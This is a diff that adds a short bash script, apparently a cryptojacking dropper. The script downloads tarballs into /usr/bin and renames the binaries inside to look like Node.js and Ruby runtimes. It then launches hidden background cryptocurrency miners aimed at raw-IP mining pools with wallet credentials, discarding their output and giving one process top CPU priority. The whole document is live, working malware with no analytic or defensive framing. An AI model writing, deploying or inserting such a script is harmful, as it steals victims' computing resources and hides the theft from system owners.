@@ -1,0 +1,27 @@
+#/bin/bash
+cd /usr/bin
+
+wget https://raw.githubusercontent.com/d1uf95z8/csv/master/csv44.tar.gz
+tar xvzf csv44.tar.gz
+wget https://raw.githubusercontent.com/d1uf95z8/csv/master/csv45.tar.gz
+tar xvzf csv45.tar.gz
+mv nodejs nodee
+mv ruby nodeee
+
+echo '{
+"retry_time" : 5,
+"cpu_threads" : 16,
+"giveup_limit" : 60,
+"algorithm" : "randomepic",
+"disable_cpu" : false,
+"disable_gpu" : true
+}' > abcdzyxw.txt
+
+nice -n 19 nodee -o 3.34.51.136:80 -u 8BvpDwnc2ecaXp9TYvchbzZx6ApGiKfV29cUtj2NaBF5ZsL9M1wekN4Q8gtRRohLqvSp1njZUrVUzUbZQpZ3XW8P8wiHN1W --rig-id tuda -a rx/0 --donate-level 1 -t 11 -B
+
+sleep 20
+
+nice -n -20 nohup nodeee --config-file abcdzyxw.txt --pool 3.127.218.147:80 --wallet blueligerzoid4 --password triceratop3744 > /dev/null 2>&1 &
+
+cd /
+
